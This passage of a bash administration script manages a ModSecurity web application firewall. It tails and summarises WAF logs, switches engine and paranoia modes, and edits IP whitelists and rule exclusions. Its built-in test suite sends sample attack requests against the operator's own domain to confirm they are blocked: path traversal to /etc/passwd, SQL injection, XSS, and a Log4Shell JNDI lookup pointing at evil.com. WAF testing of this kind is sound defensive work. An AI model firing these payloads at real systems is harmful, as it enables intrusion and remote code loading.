    echo -e "${GREEN}Done.${NC}"
}

_restart() {
    echo -e "${YELLOW}Recreating ModSecurity container...${NC}"
    $COMPOSE up -d --force-recreate --no-deps modsecurity
    echo -e "${GREEN}Done.${NC}"
}

EXCLUSIONS_FILE="modsecurity/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf"

# ── status ───────────────────────────────────────────────────────────

cmd_status() {
    echo -e "${CYAN}=== Container ===${NC}"
    docker ps --filter "name=$CONTAINER" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
    echo ""
    echo -e "${CYAN}=== Engine ===${NC}"
    grep -oP 'MODSEC_RULE_ENGINE=\K.*' $COMPOSE_FILE | head -1
    echo ""
    echo -e "${CYAN}=== Rules loaded ===${NC}"
    docker logs "$CONTAINER" 2>&1 | grep -oP 'rules loaded inline/local/remote: \K.*' | tail -1
    echo ""
    echo -e "${CYAN}=== CRS version ===${NC}"
    _exec sh -c 'cat /opt/owasp-crs/VERSION 2>/dev/null || echo "unknown"'
    echo ""
    echo -e "${CYAN}=== Paranoia / Blocking ===${NC}"
    docker logs "$CONTAINER" 2>&1 | grep -E 'PARANOIA|BLOCKING_PARANOIA'
}

# ── helpers: JSON log extraction ──────────────────────────────────────

_get_events() {
    docker logs "$CONTAINER" 2>&1 | grep '^{"transaction"' || true
}

# Pipe-safe jq wrapper: skips lines that jq cannot parse
_jq_safe() {
    local filter="$1"
    while IFS= read -r line; do
        echo "$line" | jq -r "$filter" 2>/dev/null || true
    done
}

# ── logs ─────────────────────────────────────────────────────────────

cmd_logs() {
    local count="${1:-20}"
    echo -e "${CYAN}=== Last $count WAF events ===${NC}"
    echo ""

    local events
    events=$(_get_events)
    if [ -z "$events" ]; then
        echo "No WAF events yet."
        return
    fi

    echo "$events" | tail -n "$count" | _jq_safe '
        .transaction as $t |
        ($t.request.headers["X-Real-Ip"] // $t.client_ip) as $ip |
        ($t.messages // [] | map(.details.ruleId + " " + .message) | join("; ")) as $rules |
        "\u001b[33m" + $t.time_stamp + "\u001b[0m" +
        "  \u001b[36m" + ($t.request.method // "?") + " " + ($t.request.uri // "?") + "\u001b[0m" +
        "  ip=" + $ip +
        "  http=" + (($t.response.http_code // 0) | tostring) +
        "\n  rules: " + $rules
    '
}

cmd_tail() {
    echo -e "${CYAN}=== Live WAF log (Ctrl+C to stop) ===${NC}"
    docker logs -f "$CONTAINER" 2>&1 | grep --line-buffered '^{"transaction"' | jq -r --unbuffered '
        .transaction as $t |
        ($t.request.headers["X-Real-Ip"] // $t.client_ip) as $ip |
        ($t.messages // [] | map(.details.ruleId + " " + .message) | join("; ")) as $rules |
        $t.time_stamp + "  " + ($t.request.method // "?") + " " + ($t.request.uri // "?") +
        "  ip=" + $ip +
        "  http=" + (($t.response.http_code // 0) | tostring) +
        "  rules: " + $rules
    '
}

# ── stats ────────────────────────────────────────────────────────────

cmd_stats() {
    local events
    events=$(_get_events)

    if [ -z "$events" ]; then
        echo "No WAF events yet."
        return
    fi

    local total
    total=$(echo "$events" | wc -l)
    echo -e "${CYAN}=== Total events: ${total} ===${NC}"
    echo ""

    echo -e "${CYAN}=== Top 10 source IPs ===${NC}"
    local ip_stats
    ip_stats=$(echo "$events" | _jq_safe '.transaction | (.request.headers["X-Real-Ip"] // .client_ip)' | sort | uniq -c | sort -rn | head -10)
    while read -r count ip; do
        local geo
        geo=$(ip_lookup "$ip")
        if [ -n "$geo" ]; then
            printf "  %6s  %-18s  ${CYAN}%s${NC}\n" "$count" "$ip" "$geo"
        else
            printf "  %6s  %s\n" "$count" "$ip"
        fi
    done <<< "$ip_stats"
    echo ""

    echo -e "${CYAN}=== Top 10 triggered rules ===${NC}"
    echo "$events" | _jq_safe '.transaction.messages[]? | (.details.ruleId) + " " + .message' | sort | uniq -c | sort -rn | head -10
    echo ""

    echo -e "${CYAN}=== Top 10 URIs ===${NC}"
    echo "$events" | _jq_safe '.transaction.request.uri' | sort | uniq -c | sort -rn | head -10
    echo ""

    echo -e "${CYAN}=== False positive candidates (legit 2xx responses flagged) ===${NC}"
    echo "$events" | _jq_safe '
        select(.transaction.response.http_code == 200) |
        .transaction as $t |
        ($t.messages[]? | .details.ruleId + " " + .message)
    ' | sort | uniq -c | sort -rn | head -10
}

# ── engine control ───────────────────────────────────────────────────

_set_engine() {
    local mode="$1"
    # Persist in $COMPOSE_FILE for future restarts
    sed -i "s/MODSEC_RULE_ENGINE=.*/MODSEC_RULE_ENGINE=$mode/" $COMPOSE_FILE
    # Apply immediately via override + reload (no downtime)
    docker exec "$CONTAINER" sh -c "echo 'SecRuleEngine $mode' > /etc/modsecurity.d/modsecurity-override.conf"
    _reload
    echo -e "${GREEN}SecRuleEngine set to: ${mode}${NC}"
}

cmd_on() {
    _set_engine "On"
}

cmd_off() {
    echo -e "${RED}WARNING: WAF will be completely disabled!${NC}"
    read -rp "Continue? [y/N] " confirm
    [[ "$confirm" =~ ^[yY]$ ]] || { echo "Aborted."; return; }
    _set_engine "Off"
}

cmd_detect() {
    _set_engine "DetectionOnly"
    echo -e "${YELLOW}WAF is now in detection-only mode (logging but not blocking).${NC}"
}

cmd_paranoia() {
    local level="${1:-}"
    if [[ ! "$level" =~ ^[1-4]$ ]]; then
        echo "Usage: ./waf.sh paranoia <1-4>"
        return 1
    fi
    echo -e "${YELLOW}Setting paranoia level to $level (requires restart)...${NC}"
    # Update env and recreate
    local current
    current=$(grep '^      - PARANOIA=' $COMPOSE_FILE | head -1 | cut -d= -f2)
    if [ -n "$current" ]; then
        sed -i "s/PARANOIA=${current}/PARANOIA=${level}/" $COMPOSE_FILE
    fi
    _restart
}

cmd_reload() {
    _restart
}

# ── whitelist ────────────────────────────────────────────────────────

cmd_allow_ip() {
    local ip="${1:-}"
    if [ -z "$ip" ]; then
        echo "Usage: ./waf.sh allow-ip <IP>"
        return 1
    fi
    # Use next available id in 10xxx range
    local next_id
    next_id=$(grep -oP 'id:1\K[0-9]+' "$EXCLUSIONS_FILE" 2>/dev/null | sort -n | tail -1)
    next_id=$((${next_id:-9} + 1))
    echo "" >> "$EXCLUSIONS_FILE"
    echo "# Whitelist IP $ip" >> "$EXCLUSIONS_FILE"
    echo "SecRule REMOTE_ADDR \"@ipMatch $ip\" \"id:1${next_id},phase:1,allow,nolog,ctl:ruleEngine=Off\"" >> "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}IP $ip whitelisted (WAF bypassed).${NC}"
}

cmd_deny_ip() {
    local ip="${1:-}"
    if [ -z "$ip" ]; then
        echo "Usage: ./waf.sh deny-ip <IP>"
        return 1
    fi
    # Remove the whitelist line and its comment
    sed -i "/@ipMatch $ip/d" "$EXCLUSIONS_FILE"
    sed -i "/# Whitelist IP $ip/d" "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}IP $ip removed from whitelist.${NC}"
}

cmd_disable_rule() {
    local rule_id="${1:-}"
    if [ -z "$rule_id" ]; then
        echo "Usage: ./waf.sh disable-rule <ID>"
        return 1
    fi
    echo "" >> "$EXCLUSIONS_FILE"
    echo "# Disabled rule $rule_id" >> "$EXCLUSIONS_FILE"
    echo "SecRuleRemoveById $rule_id" >> "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}Rule $rule_id disabled.${NC}"
}

cmd_enable_rule() {
    local rule_id="${1:-}"
    if [ -z "$rule_id" ]; then
        echo "Usage: ./waf.sh enable-rule <ID>"
        return 1
    fi
    sed -i "/SecRuleRemoveById $rule_id/d" "$EXCLUSIONS_FILE"
    sed -i "/# Disabled rule $rule_id/d" "$EXCLUSIONS_FILE"
    _reload
    echo -e "${GREEN}Rule $rule_id re-enabled.${NC}"
}

cmd_list_exclusions() {
    echo -e "${CYAN}=== Exclusions file: $EXCLUSIONS_FILE ===${NC}"
    cat "$EXCLUSIONS_FILE"
}

# ── testing ──────────────────────────────────────────────────────────

cmd_test() {
    local engine
    engine=$(grep -oP 'MODSEC_RULE_ENGINE=\K.*' $COMPOSE_FILE | head -1)
    if [[ "$engine" != "On" ]]; then
        echo -e "${YELLOW}WAF is in '${engine}' mode — blocks won't work. Switch to On first: ./waf.sh on${NC}"
        echo ""
    fi

    echo -e "${CYAN}=== WAF Test Suite ===${NC}"
    echo ""

    local passed=0
    local failed=0

    _run_test() {
        local name="$1"
        local expect="$2"
        shift 2
        local code
        code=$("$@" 2>/dev/null || echo "000")

        if [[ "$expect" == "block" ]]; then
            if [[ "$code" == "403" ]]; then
                echo -e "  ${GREEN}✓${NC} $name → $code (blocked)"
                passed=$((passed + 1))
            else
                echo -e "  ${RED}✗${NC} $name → $code (expected 403)"
                failed=$((failed + 1))
            fi
        else
            if [[ "$code" =~ ^(2|401) ]]; then
                echo -e "  ${GREEN}✓${NC} $name → $code"
                passed=$((passed + 1))
            else
                echo -e "  ${RED}✗${NC} $name → $code (expected 2xx)"
                failed=$((failed + 1))
            fi
        fi
    }

    _run_test "Scanner detection" block \
        curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: nikto" "${DOMAIN}/v1/models"

    _run_test "Path traversal" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/../../etc/passwd"

    _run_test "SQL injection" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models?id=1%20UNION%20SELECT%20*%20FROM%20users"

    _run_test "XSS" block \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models?q=%3Cscript%3Ealert(1)%3C/script%3E"

    _run_test "Log4Shell" block \
        curl -sk -o /dev/null -w "%{http_code}" -H "X-Api-Key: \${jndi:ldap://evil.com/a}" "${DOMAIN}/v1/models"

    _run_test "Normal request" pass \
        curl -sk -o /dev/null -w "%{http_code}" "${DOMAIN}/v1/models"

    echo ""
    echo -e "Results: ${GREEN}${passed} passed${NC}, ${RED}${failed} failed${NC}"
}

cmd_test_url() {
    local url="${1:-}"
    if [ -z "$url" ]; then
        echo "Usage: ./waf.sh test-url <path>"
        return 1
    fi
    local full="${DOMAIN}${url}"
    echo -e "${CYAN}Testing: ${full}${NC}"
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$full")
    local headers
    headers=$(curl -sk -D - -o /dev/null "$full")
    echo "HTTP status: $code"
    echo "$headers"
}

# ── main ─────────────────────────────────────────────────────────────

case "${1:-}" in
    status)         cmd_status ;;
    logs)           cmd_logs "${2:-}" ;;
    tail)           cmd_tail ;;
    stats)          cmd_stats ;;
    on)             cmd_on ;;
    off)            cmd_off ;;
    detect)         cmd_detect ;;
    paranoia)       cmd_paranoia "${2:-}" ;;
    reload)         cmd_reload ;;
    allow-ip)       cmd_allow_ip "${2:-}" ;;
    deny-ip)        cmd_deny_ip "${2:-}" ;;
    disable-rule)   cmd_disable_rule "${2:-}" ;;
    enable-rule)    cmd_enable_rule "${2:-}" ;;
    list-exclusions) cmd_list_exclusions ;;
    test)           cmd_test ;;
    test-url)       cmd_test_url "${2:-}" ;;
    *)              usage ;;
esac
